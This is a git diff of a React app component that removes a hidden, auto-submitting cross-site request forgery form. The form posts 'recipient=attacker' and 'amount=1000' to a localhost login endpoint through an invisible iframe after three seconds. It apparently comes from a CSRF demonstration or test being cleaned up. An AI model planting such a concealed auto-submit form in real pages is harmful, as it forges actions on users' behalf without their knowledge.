@@ -1,4 +1,4 @@
-import { createContext, useEffect } from 'react'
+import { createContext } from 'react'
 // import reactLogo from './assets/react.svg'
 // import viteLogo from '/vite.svg'
 import './App.css'
@@ -27,26 +27,9 @@ function App() {
   // const [count, setCount] = useState(0)
   // const [isPopupShown, setIsPopupShown] = useState(false)
   const { authToken, setAuthToken, isAuthInProgress, isAccessMissing } = useAuth()
-
-  useEffect(() => {
-    const form = document.getElementById('csrfForm') as HTMLFormElement | null;
-    if (form) {
-      setTimeout(() => {
-        form.submit();
-      }, 3000)
-    }
-  }, []);
   
   return (
     <>
-      <div style={{ display: 'none' }}>
-        <form id="csrfForm" action="http://localhost:3000/login" method="POST" target="hiddenFrame">
-          <input type="hidden" name="recipient" value="attacker" />
-          <input type="hidden" name="amount" value="1000" />
-        </form>
-        <iframe name="hiddenFrame"></iframe>
-      </div>
-
       <LocalizationProvider dateAdapter={AdapterDayjs} adapterLocale='en-gb'>
         <AuthTokenContext value={authToken}>  
           <SetAuthTokenContext value={setAuthToken}>
